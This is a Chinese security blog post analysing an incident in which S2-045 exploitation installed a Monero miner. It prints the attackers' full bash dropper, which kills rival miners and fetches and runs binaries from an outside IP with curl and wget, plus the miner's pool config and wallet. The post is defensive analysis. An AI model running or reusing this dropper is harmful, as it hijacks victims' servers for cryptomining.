@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>利用s2-045植入门罗币挖矿程序事件分析 | SY0U&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="最近发现RASP拦截到一条请求，进行了简单的分析：  日志部分是这样的：  5.188.10.251(保加利亚) 这个ip在两天内对4台服务器都发起了20+20次的请求，其中前20次是探测s2-045漏洞是否存在，后20次是发起攻击（对不同url参数进行探测所以在短时间内连续发起20个请求）攻击指令是创建一个计划任务从 5.188.87.12(荷兰) 这台主机上下载arrow.jpg文件并执行**">
+<meta property="og:type" content="website">
+<meta property="og:title" content="利用s2-045植入门罗币挖矿程序事件分析">
+<meta property="og:url" content="http://wsygoogol.github.io/利用s2-045植入门罗币挖矿程序事件分析.html">
+<meta property="og:site_name" content="SY0U&#39;s Blog">
+<meta property="og:description" content="最近发现RASP拦截到一条请求，进行了简单的分析：  日志部分是这样的：  5.188.10.251(保加利亚) 这个ip在两天内对4台服务器都发起了20+20次的请求，其中前20次是探测s2-045漏洞是否存在，后20次是发起攻击（对不同url参数进行探测所以在短时间内连续发起20个请求）攻击指令是创建一个计划任务从 5.188.87.12(荷兰) 这台主机上下载arrow.jpg文件并执行**">
+<meta property="og:image" content="h:/gitBlog/themes/landscape/source/upload_image/10-39-41.png">
+<meta property="og:image" content="h:/gitBlog/themes/landscape/source/upload_image/10-41-5.png">
+<meta property="og:image" content="h:/gitBlog/themes/landscape/source/upload_image/10-58-43.png">
+<meta property="og:image" content="h:/gitBlog/themes/landscape/source/upload_image/11-15-25.png">
+<meta property="og:updated_time" content="2018-01-09T13:04:46.572Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用s2-045植入门罗币挖矿程序事件分析">
+<meta name="twitter:description" content="最近发现RASP拦截到一条请求，进行了简单的分析：  日志部分是这样的：  5.188.10.251(保加利亚) 这个ip在两天内对4台服务器都发起了20+20次的请求，其中前20次是探测s2-045漏洞是否存在，后20次是发起攻击（对不同url参数进行探测所以在短时间内连续发起20个请求）攻击指令是创建一个计划任务从 5.188.87.12(荷兰) 这台主机上下载arrow.jpg文件并执行**">
+<meta name="twitter:image" content="h:/gitBlog/themes/landscape/source/upload_image/10-39-41.png">
+  
+    <link rel="alternate" href="/atom.xml" title="SY0U&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">SY0U&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="page-undefined" class="article article-type-page" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/利用s2-045植入门罗币挖矿程序事件分析.html" class="article-date">
+  <time datetime="2018-01-09T12:57:55.000Z" itemprop="datePublished">2018-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      利用s2-045植入门罗币挖矿程序事件分析
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近发现RASP拦截到一条请求，进行了简单的分析：</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\10-39-41.png" alt="10-39-41"></p>
+<p>日志部分是这样的：</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\10-41-5.png" alt="10-41-5"></p>
+<p><strong>5.188.10.251</strong>(保加利亚) 这个ip在两天内对4台服务器都发起了20+20次的请求，其中前20次是探测s2-045漏洞是否存在，后20次是发起攻击（对不同url参数进行探测所以在短时间内连续发起20个请求）攻击指令是创建一个计划任务从 <strong>5.188.87.12</strong>(荷兰)<strong> </strong>这台主机上下载<strong>arrow.jpg</strong>文件并执行** arrow.jpg文件是一个bash脚本，内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line">id1=<span class="string">"jbpnwjuxvc"</span></div><div class="line">id2=<span class="string">"jvdxbsjgds"</span></div><div class="line">id3=<span class="string">"xztd"</span></div><div class="line">rm -rf /var/tmp/grdd</div><div class="line">rm -rf /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id1</span>`.conf</div><div class="line">ps auxf|grep -v grep|grep -v `<span class="built_in">echo</span> <span class="variable">$id2</span>`|grep <span class="string">"/tmp/"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"\-p x"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"stratum"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"cryptonight"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"wcubpiztlk"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"laqzdbgiuz"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"sacpehnflw"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep `<span class="built_in">echo</span> <span class="variable">$id1</span>`|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps -fe|grep `<span class="built_in">echo</span> <span class="variable">$id2</span>`|grep -v grep</div><div class="line"><span class="keyword">if</span> [ $? -ne 0 ]</div><div class="line"><span class="keyword">then</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"start process....."</span></div><div class="line">chmod 777 /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf</div><div class="line">rm -rf /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf</div><div class="line">curl -o /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf http://5.188.87.12/locales/acpid.conf</div><div class="line">wget -O /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf http://5.188.87.12/locales/acpid.conf</div><div class="line">chmod 777 /var/tmp/acpid</div><div class="line">rm -rf /var/tmp/acpid</div><div class="line">cat /proc/cpuinfo|grep aes&gt;/dev/null</div><div class="line"><span class="keyword">if</span> [ $? -ne 1 ]</div><div class="line"><span class="keyword">then</span></div><div class="line">curl -o /var/tmp/acpid http://5.188.87.12/locales/acpid</div><div class="line">wget -O /var/tmp/acpid http://5.188.87.12/locales/acpid</div><div class="line"><span class="keyword">else</span></div><div class="line">curl -o /var/tmp/acpid http://5.188.87.12/locales/acpid_na</div><div class="line">wget -O /var/tmp/acpid http://5.188.87.12/locales/acpid_na</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /var/tmp/acpid</div><div class="line"><span class="built_in">cd</span> /var/tmp</div><div class="line">proc=`grep -c ^processor /proc/cpuinfo`</div><div class="line">cores=$(((<span class="variable">$proc</span>+1)/2))</div><div class="line">nohup ./acpid -c `<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf -t `<span class="built_in">echo</span> <span class="variable">$cores</span>` &gt;/dev/null &amp;</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"runing....."</span></div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
+<p>主要功能是从 <strong><a href="http://5.188.87.12" target="_blank" rel="external">http://5.188.87.12</a></strong> 下载一个配置文件 <strong>acpid.conf </strong>并重命名，并且下载了 <strong>acpid</strong> 和 <strong>acpid_na </strong>两个样本，</p>
+<p>然后获取了受害主机的cpu核数，把配置文件内容和cpu核数作为参数执行 <strong>acpid</strong> 这个程序</p>
+<p><strong>acpid.conf </strong>内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line"><span class="string">"url"</span> : <span class="string">"stratum+tcp://158.69.25.71:80"</span>,</div><div class="line"><span class="string">"user"</span> : <span class="string">"43We5FWNCmqffXY5tHriA3LMqhCRgXP9uZvMAZ8gfG7SYaLdQTpo2GGPDjk6zWdGAe6RedPTRhmC1EkGnAY3dPE62H3Gu8R"</span>,</div><div class="line"><span class="string">"pass"</span> : <span class="string">"x"</span>,</div><div class="line"><span class="string">"algo"</span> : <span class="string">"cryptonight"</span>,</div><div class="line"><span class="string">"quiet"</span> : <span class="literal">true</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>根据配置文件内容判断这应该是一个挖矿程序，访问其中了url地址发现返回的是一个 <strong>minexmr</strong> id</p>
+<p>由此判断这属于<strong>门罗币</strong>的挖矿样本，查了一下这个钱包地址应该还在持续收益<img src="H:\gitBlog\themes\landscape\source\upload_image\10-58-43.png" alt="10-58-43"></p>
+<p>脚本中出现的两个样本hash分别为</p>
+<p>9359f7e7b1dd0f4ce4a2c52fe611c981a3dd7a17f935862e3ce9acb5f2df8ced</p>
+<p>f4864b3793c93de50b953e9751dc22e03fa0333ae6856d8d153be9018da6d911</p>
+<p>在virustotal上查询了这两个样本，第一次出现都是在10月30日，在24小时前还被重新上传分析，判断这个样本在近期又开始活跃了:</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\11-15-25.png" alt="11-15-25"></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>通过几次的攻击行为来看利用已公开的漏洞植入恶意挖矿程序变得越来越流行，虚拟货币不断增值也更促进了这一产业链的不断扩大</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/利用s2-045植入门罗币挖矿程序事件分析.html" data-id="cjemu1rl3000anovhon0lgd5a" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/03/06/利用Memcached的反射型DDOS攻击/">利用Memcached的反射型DDOS攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/28/metasploit备忘/">metasploit备忘</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/25/利用XMRig的大规模Monero挖矿行为/">利用XMRig的大规模Monero挖矿行为</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/05/几种常见检测思路的特点/">几种常见检测思路的特点</a>
+          </li>
+        
+          <li>
+            <a href="/2017/12/27/vBulletin-routestring-Unauthenticated-Remote-Code-Execution-Vulnerability/">vBulletin routestring Unauthenticated Remote Code Execution Vulnerability</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <!--
+<footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 SY0U<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+-->
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
